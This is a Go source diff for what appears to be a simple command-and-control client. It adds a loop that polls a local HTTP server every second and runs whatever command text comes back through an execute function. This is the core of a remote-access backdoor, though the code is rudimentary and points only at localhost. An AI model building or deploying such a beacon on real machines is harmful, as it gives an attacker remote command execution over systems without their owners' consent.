@@ -11,7 +11,7 @@ import (
     "log"
     "os/exec"
 
-
+    "time"
 
 )
 
@@ -32,20 +32,16 @@ func recieveCommand(path string) string{
     }
     defer resp.Body.Close()
 
-    ioutil.ReadAll(resp.Body)
-
-    if err != nil {
-
-        fmt.Println("no repsonse...")
-        return ""
-    }
-
     body, err := ioutil.ReadAll(resp.Body)
+    fmt.Println(execute(string(body)))
     return string(body)
-   // return execute(exec)
+   
 
 }
 
+func rsp(response string) { 
+    
+}
 
 
 func main() {
@@ -75,6 +71,10 @@ func main() {
         print(err)
     }
     fmt.Println(string(body))
+    for{
+    fmt.Println(ip)
     recieveCommand("http://127.0.0.1:8080/" + ip)
+    time.Sleep(1000 * time.Millisecond)
+    }
 
 }
